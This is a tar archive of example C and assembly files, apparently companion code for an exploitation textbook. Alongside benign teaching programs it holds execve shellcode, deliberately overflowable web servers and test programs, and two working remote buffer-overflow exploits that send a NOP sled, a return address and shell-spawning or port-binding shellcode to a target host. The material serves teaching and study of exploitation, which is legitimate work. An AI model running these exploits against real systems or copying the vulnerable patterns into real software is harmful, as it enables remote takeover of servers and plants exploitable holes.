	time_ptr = &current_time;  // set time_ptr to the address of
                              // the current_time struct
	localtime_r(&seconds_since_epoch, time_ptr);

	// three different ways to access struct elements
	hour = current_time.tm_hour;  // direct access
	minute = time_ptr->tm_min;    // access via pointer
	second = *((int *) time_ptr); // hacky pointer access

	printf("Current time is: %02d:%02d:%02d\n", hour, minute, second);
}
	
	
                                                                                                                                                                                                                                                                              tiny_shell                                                                                          0000644 0001747 0001747 00000000031 12564742435 012463  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 1�Ph//shh/bin��P��S��̀                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       tiny_shell.s                                                                                        0000644 0001747 0001747 00000001210 12564742435 012724  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32

; execve(const char *filename, char *const argv [], char *const envp[])
  xor eax, eax      ; zero our eax
  push eax          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push eax          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  mov al, 11        ; syscall #11
  int 0x80          ; do it

                                                                                                                                                                                                                                                                                                                                                                                        tinyweb.c                                                                                           0000644 0001747 0001747 00000011573 12564742435 012230  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "hacking.h"
#include "hacking-network.h"

#define PORT 80   // the port users will be connecting to
#define WEBROOT "./webroot" // the web server's root directory

void handle_connection(int, struct sockaddr_in *); // handle web requests
int get_file_size(int); // returns the filesize of open file descriptor

int main(void) {
   int sockfd, new_sockfd, yes=1; 
   struct sockaddr_in host_addr, client_addr;   // my address information
   socklen_t sin_size;

   printf("Accepting web requests on port %d\n", PORT);

   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
      fatal("in socket");

   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
      fatal("setting socket option SO_REUSEADDR");

   host_addr.sin_family = AF_INET;      // host byte order
   host_addr.sin_port = htons(PORT);    // short, network byte order
   host_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP
   memset(&(host_addr.sin_zero), '\0', 8); // zero the rest of the struct

   if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)
      fatal("binding to socket");

   if (listen(sockfd, 20) == -1)
      fatal("listening on socket");

   while(1) {   // Accept loop
      sin_size = sizeof(struct sockaddr_in);
      new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
      if(new_sockfd == -1)
         fatal("accepting connection");

      handle_connection(new_sockfd, &client_addr);
   }
   return 0;
}

/* This function handles the connection on the passed socket from the
 * passed client address.  The connection is processed as a web request
 * and this function replies over the connected socket.  Finally, the 
 * passed socket is closed at the end of the function.
 */
void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr) {
   unsigned char *ptr, request[500], resource[500];
   int fd, length;

   length = recv_line(sockfd, request);

   printf("Got request from %s:%d \"%s\"\n", inet_ntoa(client_addr_ptr->sin_addr), ntohs(client_addr_ptr->sin_port), request);

   ptr = strstr(request, " HTTP/"); // search for valid looking request
   if(ptr == NULL) { // then this isn't valid HTTP
      printf(" NOT HTTP!\n");
   } else {
      *ptr = 0; // terminate the buffer at the end of the URL
      ptr = NULL; // set ptr to NULL (used to flag for an invalid request)
      if(strncmp(request, "GET ", 4) == 0)  // get request
         ptr = request+4; // ptr is the URL
      if(strncmp(request, "HEAD ", 5) == 0) // head request
         ptr = request+5; // ptr is the URL

      if(ptr == NULL) { // then this is not a recognized request
         printf("\tUNKNOWN REQUEST!\n");
      } else { // valid request, with ptr pointing to the resource name
         if (ptr[strlen(ptr) - 1] == '/')  // for resources ending with '/'
            strcat(ptr, "index.html");     // add 'index.html' to the end
         strcpy(resource, WEBROOT);     // begin resource with web root path
         strcat(resource, ptr);         //  and join it with resource path
         fd = open(resource, O_RDONLY, 0); // try to open the file
         printf("\tOpening \'%s\'\t", resource);
         if(fd == -1) { // if file is not found
            printf(" 404 Not Found\n");
            send_string(sockfd, "HTTP/1.0 404 NOT FOUND\r\n");
            send_string(sockfd, "Server: Tiny webserver\r\n\r\n");
            send_string(sockfd, "<html><head><title>404 Not Found</title></head>");
            send_string(sockfd, "<body><h1>URL not found</h1></body></html>\r\n");
         } else {      // otherwise, serve up the file
            printf(" 200 OK\n");
            send_string(sockfd, "HTTP/1.0 200 OK\r\n");
            send_string(sockfd, "Server: Tiny webserver\r\n\r\n");
            if(ptr == request + 4) { // then this is a GET request
               if( (length = get_file_size(fd)) == -1)
                  fatal("getting resource file size");
               if( (ptr = (unsigned char *) malloc(length)) == NULL)
                  fatal("allocating memory for reading resource");
               read(fd, ptr, length); // read the file into memory
               send(sockfd, ptr, length, 0);  // send it to socket
               free(ptr); // free file memory
            }
            close(fd); // close the file
         } // end if block for file found/not found
      } // end if block for valid request
   } // end if block for valid HTTP
   shutdown(sockfd, SHUT_RDWR); // close the socket gracefully
}

/* This function accepts an open file descriptor and returns     
 * the size of the associated file.  Returns -1 on failure.
 */
int get_file_size(int fd) {
   struct stat stat_struct;

   if(fstat(fd, &stat_struct) == -1)
      return -1;
   return (int) stat_struct.st_size;
}
                                                                                                                                     tinywebd.c                                                                                          0000644 0001747 0001747 00000014676 12564742435 012403  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <sys/stat.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h> 
#include <sys/types.h> 
#include <sys/stat.h> 
#include <fcntl.h> 
#include <time.h> 
#include <signal.h> 
#include "hacking.h" 
#include "hacking-network.h" 

#define PORT 80   // the port users will be connecting to 
#define WEBROOT "./webroot" // the web server's root directory 
#define LOGFILE "/var/log/tinywebd.log" // log filename 
   
int logfd, sockfd;  // global log and socket file descriptors 
void handle_connection(int, struct sockaddr_in *, int); 
int get_file_size(int); // returns the filesize of open file descriptor 
void timestamp(int); // writes a timestamp to the open file descriptor 

// This function is called when the process is killed 
void handle_shutdown(int signal) { 
   timestamp(logfd); 
   write(logfd, "Shutting down..\n", 16); 
   close(logfd); 
   close(sockfd); 
   exit(0); 
} 

int main(void) { 
   int new_sockfd, yes=1; 
   struct sockaddr_in host_addr, client_addr;   // my address information 
   socklen_t sin_size; 

   logfd = open(LOGFILE, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR); 
   if(logfd == -1) 
      fatal("opening log file"); 

   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) 
      fatal("in socket"); 

   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) 
      fatal("setting socket option SO_REUSEADDR"); 

   printf("Starting tiny web daemon..\n"); 
   if(daemon(1, 0) == -1) // fork to a background daemon process 
      fatal("forking to daemon process"); 
   
   signal(SIGTERM, handle_shutdown);   // call handle_shutdown when killed
   signal(SIGINT, handle_shutdown);   // call handle_shutdown when interrupted
   
   timestamp(logfd); 
   write(logfd, "Starting up..\n", 15); 
   host_addr.sin_family = AF_INET;      // host byte order 
   host_addr.sin_port = htons(PORT);    // short, network byte order 
   host_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP 
   memset(&(host_addr.sin_zero), '\0', 8); // zero the rest of the struct 

   if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1) 
      fatal("binding to socket"); 

   if (listen(sockfd, 20) == -1) 
      fatal("listening on socket"); 

   while(1) {   // Accept loop 
      sin_size = sizeof(struct sockaddr_in); 
      new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size); 
      if(new_sockfd == -1) 
         fatal("accepting connection"); 

      handle_connection(new_sockfd, &client_addr, logfd); 
   } 
   return 0; 
} 

/* This function handles the connection on the passed socket from the 
 * passed client address and logs to the passed FD. The connection is 
 * processed as a web request and this function replies over the connected
 * socket.  Finally, the passed socket is closed at the end of the function. 
 */ 
void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) { 
   unsigned char *ptr, request[500], resource[500], log_buffer[500]; 
   int fd, length; 

   length = recv_line(sockfd, request); 
   
   sprintf(log_buffer, "From %s:%d \"%s\"\t", inet_ntoa(client_addr_ptr->sin_addr), ntohs(client_addr_ptr->sin_port), request); 

   ptr = strstr(request, " HTTP/"); // search for valid looking request 
   if(ptr == NULL) { // then this isn't valid HTTP 
      strcat(log_buffer, " NOT HTTP!\n"); 
   } else { 
      *ptr = 0; // terminate the buffer at the end of the URL 
      ptr = NULL; // set ptr to NULL (used to flag for an invalid request) 
      if(strncmp(request, "GET ", 4) == 0)  // get request 
         ptr = request+4; // ptr is the URL 
      if(strncmp(request, "HEAD ", 5) == 0) // head request 
         ptr = request+5; // ptr is the URL 
      if(ptr == NULL) { // then this is not a recognized request 
         strcat(log_buffer, " UNKNOWN REQUEST!\n"); 
      } else { // valid request, with ptr pointing to the resource name 
         if (ptr[strlen(ptr) - 1] == '/')  // for resources ending with '/' 
            strcat(ptr, "index.html");     // add 'index.html' to the end 
         strcpy(resource, WEBROOT);     // begin resource with web root path 
         strcat(resource, ptr);         //  and join it with resource path 
         fd = open(resource, O_RDONLY, 0); // try to open the file 
         if(fd == -1) { // if file is not found 
            strcat(log_buffer, " 404 Not Found\n"); 
            send_string(sockfd, "HTTP/1.0 404 NOT FOUND\r\n"); 
            send_string(sockfd, "Server: Tiny webserver\r\n\r\n"); 
            send_string(sockfd, "<html><head><title>404 Not Found</title></head>"); 
            send_string(sockfd, "<body><h1>URL not found</h1></body></html>\r\n"); 
         } else {      // otherwise, serve up the file 
            strcat(log_buffer, " 200 OK\n"); 
            send_string(sockfd, "HTTP/1.0 200 OK\r\n"); 
            send_string(sockfd, "Server: Tiny webserver\r\n\r\n"); 
            if(ptr == request + 4) { // then this is a GET request 
               if( (length = get_file_size(fd)) == -1) 
                  fatal("getting resource file size"); 
               if( (ptr = (unsigned char *) malloc(length)) == NULL) 
                  fatal("allocating memory for reading resource"); 
               read(fd, ptr, length); // read the file into memory 
               send(sockfd, ptr, length, 0);  // send it to socket 
               free(ptr); // free file memory 
            } 
            close(fd); // close the file 
         } // end if block for file found/not found 
      } // end if block for valid request 
   } // end if block for valid HTTP 
   timestamp(logfd); 
   length = strlen(log_buffer); 
   write(logfd, log_buffer, length); // write to the log 

   shutdown(sockfd, SHUT_RDWR); // close the socket gracefully
} 

/* This function accepts an open file descriptor and returns     
 * the size of the associated file. Returns -1 on failure. 
 */ 
int get_file_size(int fd) { 
   struct stat stat_struct; 

   if(fstat(fd, &stat_struct) == -1) 
      return -1; 
   return (int) stat_struct.st_size; 
} 

/* This function writes a timestamp string to the open file descriptor 
 * passed to it. 
 */ 
void timestamp(fd) { 
   time_t now; 
   struct tm *time_struct; 
   int length; 
   char time_buffer[40]; 

   time(&now);  // get number of seconds since epoch 
   time_struct = localtime((const time_t *)&now); // convert to tm struct 
   length = strftime(time_buffer, 40, "%m/%d/%Y %H:%M:%S> ", time_struct); 
   write(fd, time_buffer, length); // write timestamp string to log 
} 
                                                                  tinyweb_exploit2.c                                                                                  0000644 0001747 0001747 00000003725 12564742435 014056  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include "hacking.h"
#include "hacking-network.h"

char shellcode[]=
"\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80" 
"\x96\x6a\x66\x58\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10" 
"\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80" 
"\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f" 
"\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";
// port-binding shellcode on port 31337

#define OFFSET 540
#define RETADDR 0xbffff688

int main(int argc, char *argv[]) {
   int sockfd, buflen;
   struct hostent *host_info;
   struct sockaddr_in target_addr;
   unsigned char buffer[600];
   
   if(argc < 2) {
      printf("Usage: %s <hostname>\n", argv[0]);
      exit(1);
   }

   if((host_info = gethostbyname(argv[1])) == NULL)
      fatal("looking up hostname");

   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
      fatal("in socket");

   target_addr.sin_family = AF_INET;
   target_addr.sin_port = htons(80);   
   target_addr.sin_addr = *((struct in_addr *)host_info->h_addr);
   memset(&(target_addr.sin_zero), '\0', 8); // zero the rest of the struct

   if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
      fatal("connecting to target server");

   bzero(buffer, 600);                      // zero out the buffer
   memset(buffer, '\x90', OFFSET);          // build a NOP sled
   *((u_int *)(buffer + OFFSET)) = RETADDR; // put the return address in
   memcpy(buffer+300, shellcode, strlen(shellcode)); // shellcode
   strcat(buffer, "\r\n");                  // terminate the string
   printf("Exploit buffer:\n");
   dump(buffer, strlen(buffer));  // show the exploit buffer               
   send_string(sockfd, buffer);   // send exploit buffer as a HTTP request

   exit(0);
}
                                           tinyweb_exploit.c                                                                                   0000644 0001747 0001747 00000003323 12564742435 013766  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include "hacking.h"
#include "hacking-network.h"

char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";  // standard shellcode

#define OFFSET 540
#define RETADDR 0xbffff688

int main(int argc, char *argv[]) {
   int sockfd, buflen;
   struct hostent *host_info;
   struct sockaddr_in target_addr;
   unsigned char buffer[600];
   
   if(argc < 2) {
      printf("Usage: %s <hostname>\n", argv[0]);
      exit(1);
   }

   if((host_info = gethostbyname(argv[1])) == NULL)
      fatal("looking up hostname");

   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
      fatal("in socket");

   target_addr.sin_family = AF_INET;
   target_addr.sin_port = htons(80);   
   target_addr.sin_addr = *((struct in_addr *)host_info->h_addr);
   memset(&(target_addr.sin_zero), '\0', 8); // zero the rest of the struct

   if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
      fatal("connecting to target server");

   bzero(buffer, 600);                      // zero out the buffer
   memset(buffer, '\x90', OFFSET);          // build a NOP sled
   *((u_int *)(buffer + OFFSET)) = RETADDR; // put the return address in
   memcpy(buffer+300, shellcode, strlen(shellcode)); // shellcode
   strcat(buffer, "\r\n");                  // terminate the string
   printf("Exploit buffer:\n");
   dump(buffer, strlen(buffer));  // show the exploit buffer               
   send_string(sockfd, buffer);   // send exploit buffer as a HTTP request

   exit(0);
}
                                                                                                                                                                                                                                                                                                             typecasting.c                                                                                       0000644 0001747 0001747 00000000474 12564742435 013077  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int main() {
   int a, b;
   float c, d;

   a = 13;
   b = 5;

   c = a / b;                  // divide using integers
   d = (float) a / (float) b;  // divide integers typecast as floats

   printf("[integers]\t a = %d\t b = %d\n", a, b);
   printf("[floats]\t c = %f\t d = %f\n", c, d);
}
	
	
                                                                                                                                                                                                    uid_demo.c                                                                                          0000644 0001747 0001747 00000000167 12564742435 012331  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int main()
{
   printf("real uid: %d\n", getuid());
   printf("effective uid: %d\n", geteuid());
}
                                                                                                                                                                                                                                                                                                                                                                                                         update_info.c                                                                                       0000644 0001747 0001747 00000002774 12564742435 013047  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_ID_LEN 40

/* barf a message and exit */
void barf(char *message, void *extra) {
   printf(message, extra);
   exit(1);
}

/* pretend this function updates a product description in a database */
void update_product_description(char *id, char *desc)
{
   char product_code[5];
   strcpy(product_code, id);

   // update database
   printf("Updating product #%s with description \'%s\'\n", product_code, desc);
}

int main(int argc, char *argv[], char *envp[])
{
  int i;
  char *id, *desc;

  if(argc < 2)
     barf("Usage: %s <id> <description>\n", argv[0]);
  id = argv[1];   // id - product code to update in DB 
  desc = argv[2]; // desc - item description to update

  if(strlen(id) > MAX_ID_LEN) // id must be less than MAX_ID_LEN bytes
     barf("Fatal: id argument must be less than %u bytes\n", (void *)MAX_ID_LEN);

  for(i=0; i < strlen(desc)-1; i++) { // only allow printable bytes in desc
     if(!(isprint(desc[i]))) 
        barf("Fatal: description argument can only contain printable bytes\n", NULL);
  }

  // clearing out the stack memory (security)
  // clearing all arguments except the first and second
  memset(argv[0], 0, strlen(argv[0]));
  for(i=3; argv[i] != 0; i++)
    memset(argv[i], 0, strlen(argv[i]));
  // clearing all environment variables
  for(i=0; envp[i] != 0; i++)
    memset(envp[i], 0, strlen(envp[i]));

  printf("[DEBUG]: desc argument is at %p\n", desc);
  update_product_description(id, desc); // update database
}
    vuln.c                                                                                              0000644 0001747 0001747 00000000146 12564742435 011525  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 int main(int argc, char *argv[]) { 
   char buffer[5]; 
   strcpy(buffer, argv[1]); 
   return 0; 
} 
                                                                                                                                                                                                                                                                                                                                                                                                                          webroot/                                                                                            0000755 0001747 0001747 00000000000 12564742435 012055  5                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 webroot/index.html                                                                                  0000644 0001747 0001747 00000000405 12564742435 014051  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 <html>
<head><title>A sample webpage</title></head>
<body bgcolor="#000000" text="#ffffffff">
<center>
<h1>This is a sample webpage</h1>
...and here is some sample text<br>
<br>
..and even a sample image:<br>
<img src="image.jpg"><br>
</center>
</body>
</html>
                                                                                                                                                                                                                                                           webroot/image.jpg                                                                                   0000744 0001747 0001747 00000133312 12564742435 013645  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 ���� JFIF  H H  ��XICC_PROFILE   HLino  mntrRGB XYZ �  	  1  acspMSFT    IEC sRGB             ��     �-HP                                                 cprt  P   3desc  �   lwtpt  �   bkpt     rXYZ     gXYZ  ,   bXYZ  @   dmnd  T   pdmdd  �   �vued  L   �view  �   $lumi  �   meas     $tech  0   rTRC  <  gTRC  <  bTRC  <  text    Copyright (c) 1998 Hewlett-Packard Company  desc       sRGB IEC61966-2.1           sRGB IEC61966-2.1                                                  XYZ       �Q    �XYZ                 XYZ       o�  8�  �XYZ       b�  ��  �XYZ       $�  �  ��desc       IEC http://www.iec.ch           IEC http://www.iec.ch                                              desc       .IEC 61966-2.1 Default RGB colour space - sRGB           .IEC 61966-2.1 Default RGB colour space - sRGB                      desc       ,Reference Viewing Condition in IEC61966-2.1           ,Reference Viewing Condition in IEC61966-2.1                          view     �� _. � ��  \�   XYZ      L	V P   W�meas                         �   sig     CRT curv           
     # ( - 2 7 ; @ E J O T Y ^ c h m r w | � � � � � � � � � � � � � � � � � � � � � � � � �%+28>ELRY`gnu|����������������&/8AKT]gqz������������ !-8COZfr~���������� -;HUcq~���������+:IXgw��������'7HYj{�������+=Oat�������2FZn�������		%	:	O	d	y	�	�	�	�	�	�

'
=
T
j
�
�
�
�
�
�"9Qi������*C\u�����&@Zt�����.Id����	%A^z����	&Ca~����1Om����&Ed����#Cc����'Ij����4Vx���&Il����Ae����@e���� Ek���*Qw���;c���*R{���Gp���@j���>i���  A l � � �!!H!u!�!�!�"'"U"�"�"�#
#8#f#�#�#�$$M$|$�$�%	%8%h%�%�%�&'&W&�&�&�''I'z'�'�((?(q(�(�))8)k)�)�**5*h*�*�++6+i+�+�,,9,n,�,�--A-v-�-�..L.�.�.�/$/Z/�/�/�050l0�0�11J1�1�1�2*2c2�2�33F33�3�4+4e4�4�55M5�5�5�676r6�6�7$7`7�7�88P8�8�99B99�9�:6:t:�:�;-;k;�;�<'<e<�<�="=a=�=�> >`>�>�?!?a?�?�@#@d@�@�A)AjA�A�B0BrB�B�C:C}C�DDGD�D�EEUE�E�F"FgF�F�G5G{G�HHKH�H�IIcI�I�J7J}J�KKSK�K�L*LrL�MMJM�M�N%NnN�O OIO�O�P'PqP�QQPQ�Q�R1R|R�SS_S�S�TBT�T�U(UuU�VV\V�V�WDW�W�X/X}X�YYiY�ZZVZ�Z�[E[�[�\5\�\�]']x]�^^l^�__a_�``W`�`�aOa�a�bIb�b�cCc�c�d@d�d�e=e�e�f=f�f�g=g�g�h?h�h�iCi�i�jHj�j�kOk�k�lWl�mm`m�nnkn�ooxo�p+p�p�q:q�q�rKr�ss]s�ttpt�u(u�u�v>v�v�wVw�xxnx�y*y�y�zFz�{{c{�|!|�|�}A}�~~b~�#��G���
�k�͂0����W�������G����r�ׇ;����i�Ή3�����d�ʋ0�����c�ʍ1�����f�Ώ6����n�֑?����z��M��� �����_�ɖ4���
�u���L���$�����h�՛B��������d�Ҟ@��������i�ءG���&����v��V�ǥ8��������n��R�ĩ7�������u��\�ЭD���-������ �u��`�ֲK�³8���%�������y��h��Y�ѹJ�º;���.���!������
�����z���p���g���_���X���Q���K���F���Aǿ�=ȼ�:ɹ�8ʷ�6˶�5̵�5͵�6ζ�7ϸ�9к�<Ѿ�?���D���I���N���U���\���d���l���v��ۀ�܊�ݖ�ޢ�)߯�6��D���S���c���s��������2��F���[���p������(��@���X���r������4���P���m��������8���W���w����)���K���m���� C 		
	
�� C�� r ��          	
�� E  	!
"1#$w3789v�%AQ��&2�4BRa�Ebu����             �� 8     !1�AQa"q����23����B#R�rb����   ? ��8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�kݫ�fƿɱLhd_.�з(���:]9#�J�Q�2�c% ��F)��ǔNBYZ�S8��]�����A��ݭ�E��N���gl,�.1����r��xq��0��TÓ]��Fl�<⣤؉��U�YB6m����N�MЍ7't�N�z��3��ۼ�eimq��K5�[���݄;��G��Ϫ�6.�Ƭ��D�k���-�$y��H4hgǢI�S�Js�W�e����n�'>mٍ�/l��]�ec��	��F���*���,~���7v�P��<vj����%�xč����������T�+�qÍ�����ď��O<p���|}��� q�7O�[&/6��k4����ST��Yu�j��D)y�Y�� ��q%���؈E^ϵJv�� jY���xc�h�j*7{�/]g�����?/��Y��,u�R��z'#���$ָr�a
Ū���6�vY}�?�Z'�-�.9�8��(�Jv�W��xa��:�F�ogkbD�������6�*����/rl�Ěc�q�J�&O��J�Me]V͛2��(e+M���1��B�RO6����9f]Od�����ȵ�7��v����� Z�i3}�S�1�TH��Ky�l]���2a�592@������=�hߛ��ӻ� ��g�?���%�[9�� ���6�qԚg�������rλ.�ʤ��X�b��Hs�P��?��⌟�?����2�4Kh�p��w��]3�,q�%��e)F���z��R�巺[/`d�Fy�I��c����*v���6�����l|���u� ���J��,:(.�ȋ�u}��n���qÒ����S�����,z�	Q�a�W�γuנ9�T;YA��_m��\���}Ym�o�C��6��J��%��n#��0���6��#��.7�y�6jpr{ˏ�1>c���{��=��x�����4��䛼o�J��q��Wl$(�]&@��$�*Ίʢ)��mҔ������.}o�o����]�s��{��m�Cw���N���3ҍ)�E�%Xm	xu�u��6y6����$���3�J�g(ζr��6���������|q\3G%�E_u]���F��?9�<Ӥ�Z�Y6��Xv-S?����R��҂4�z�K"Qv�[qbG��]@���~
�.ӷ>=9���vu�',q�l�.�|��llO���uo���ȷ����u�qF`ax���Z��W+sg+��Yr��@/+�6i���U&�/���V�%�Wxr9�ӌx^�J��~j~[��̡k���_^�X�Y4v%�1ѥ�+�r�g3��Kq*\nKl�n��q�ulZ9�� �W|x����~�vw�.��ᕹz���\�S��2�VkK|�q��ܺV?_&�uM�A
dÌ뱅�FHԈ�IG�"���#�6D=��,%Ńb`�g>��-[�7p���
�%UDDO��3� � � � � � � � � � � � � � � ��`�RD���v.�b7!��%{?\f�EG����"�!�xBE_>|�V���ܩ���ܺ��i�v�14R%&]PP�W%R��UUQQx�#]��L�V�I�G�nU�BKj�^QG��`D� �TO	�?jl�n�2l�(�K7I�+u̳&��@B7�Cp�iIUU� Jp��\kˬ~'q�avشYM͍[&��bF�}��l���j�����E��?ծ��׳ߵ��p۫G}~�2�y�=E=��U|""~��""p�.��0eO�\�p�Jv[�j�8�$���p�<�:O<�*�SWKϲ�Ӌ��0����b�(NW(�^�
�3S6< � �""%��RUT�̛�u�� �3��;�Y{��2LmE[��(z���*.x�OT� ��S)X��|c�Տo���7#������+���|����� � 䧱5{/Rv��z�#�Vac�xl3��]@��e#������	��2duU��iEP�ڛs������[r�޷�j��t�w���;�������:�A�R�Zk�6y�5ݔ+1�Ǯ�)�*cL��L~��-��TH�����i�%�����{�|�Ҡ������Z���;��\Ye� �ꖎ��3L"�̵��i�Cj;/B��hg2͙�ucI� &"䑦��3����r~�,�ʷ\���k���w|�v���U��N��'I�u��Տ��w�a�R�˩�e��E�l
O2J-�gD��lR�株J85|�t��-�,��� ��� ,��޺.��_�m�{j����[W2��<������
���X�bʱ���2�Sj�:�m����Q�QY�7�כǸ���f�_X�a�2�w�?� H}Q�7�� �ȿ������?��#�>�>ϣ�����o__o��=3(�z����ŋ�z���mq�(ԶդI�_�c�@/��10$EE�&��u;;�cOo͑�݋�u�7Ҳ|���u��HE~���pm�ǁ�����#ᙪ�:�6N~+p����]����I��9q��������������������_���3~��꾾��rE�[�λ,�Y�I�\8
���&Ǜ!�#Ho�'ؤ�
9�Ƨ{�g�ǙgƞW<����֫�I���	�Ưc�6I�[K�@�_ߓ&S��m��3Xi��ƚ��Q9Oe�n���a:�o2aPh]C�l�ŷ��z��`E���ظn<���0��u���nK�(�i�"�*���{�!r��+|Y�Ul�*�j�ir��@��G0��6�8bCyRoʌ̅b/��8*J*�^h[%/��k�n���$z��v>H֫H��vġ���{d��*_��4a$#M8f6���p9�|�ӎ=]�U����}�Ȏ��m��&֛/��p[��ƺZ*���	U0pM�1!!@!F3�2N�����nWy�kKI��5�ܰ��X8���<���j�m��羶,�P�R�NW)�k��Ȱ�X p p p p p p p p p p p p p p p p p p p p p p ���Cϱ��/4��ɱK8�}|Ƒ�e2i���� ���O߀V��2/����9�]�'$�U��z�i��n�/q�tk�g8���C�}�Y?cQ�U�����nI����|r�9���,KD��8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�8�b����S!��'��=�W Z�\�jl8ƞ��m������NBpMY�u6��b�2�<%FƶnF�·<b�ao1L���n��S��h�TB5���"�ǐ__��'$��A&ݑc%Ű�|	Q��}�y��40t	<��'�B�����*rg��h��vSEug��{���e�3����#�=�(�F��L�JB!;n:dH"��ʪME]��vE}Um>���l������SWc1�fT�n��VS�U=�(�1�}��=\���y�
�R�咲����X��1��a�}0rߓ�O�W���%]xE���B<j=����TB��p���؂�]fC��CO<Eԋ��s���^5��z�ܛ�k��^{u�N��̢�½� ¾��Q�1Y�F
ޱ�5�tU��� !*"��[iՌ����.̒<��� � � � 7� ɿN:�ex&I�el-�F�;q��2r;zD!B�n8�X(��<㴂�Jh����h���Y�'���+� �-Ƿ�� uK���U��ѡس&�6zA��hx}U����(���(#�΀�̙���5e���Mz�J����k����K�?���J��Y+)����i�-��$��U�ˀ㪠@�0�2�E�L��{:�w��� _ot퟿��^�h������J�$�Z�;��ۊ�8��HT�U��� �������`�_*�ME/ż� ��[�(:��g�]�WI3&�ɴ#��3^�����1��h��k+�~m���(����<�+����&���Xz��m~Kp�.-�H��J�6�̼ɡ��I�LI?bEEEO�S�����8�8�8�8�8�8�8�8�8�8�8�8�|��E��&����}�e�^0t	<��B�����*p
��I�����n�썵�]�|td�B��bd���`ñ~]tH��\��:�[��dZja�}̧�6�B8(Щ
����kVH��HJ�"�݅���5�1��Z1(���͌o�ÚpP>բ�K�u��X��H��TH���_Mx��~ϙ���e�������z�>��M��=��h����1�;*�>�~��4Q�8�Ai�u]5u�UnƄS�x�oV^%U�e�%����������[7���&�dv��FH ��#�d���D�(����UU���'d}��lk݄Q�=�1����\�X�6$�!BOWZ%>	<��)��D�a$��GZiٚ����d2LgbeT�6�h�֋a�rqܢ�L>�hl��8�b�8�>�ƈ����	RM��B2iYq"̭��7�Y�rk9_$]yi�;��p�6 ���,��K��6�&/��J�%:T�C��.��q���;FY`��|ɣ�~�����|�������k6!�l�QH�1F,����}U�<3%��PUP|~���X�^,���$�-88�8�k���u���ٞ�����8�,�nl�F���	��/�RUTE#"R$E�撻��M�#�����|��K�����z
